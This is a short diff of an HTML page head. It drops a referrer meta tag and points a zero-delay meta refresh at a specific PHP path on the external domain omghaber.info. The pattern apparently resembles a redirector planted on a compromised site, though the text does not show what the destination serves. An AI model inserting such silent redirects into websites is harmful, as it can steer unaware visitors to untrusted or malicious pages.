@@ -1,5 +1,4 @@
 <heaD>
-<meta name="referrer" content="origin">
 
-<meta http-equiv="refresh" content="0;url=http://omghaber.info"> 
+<meta http-equiv="refresh" content="0;url=http://omghaber.info/pkkwi/index.php"> 
 </head>
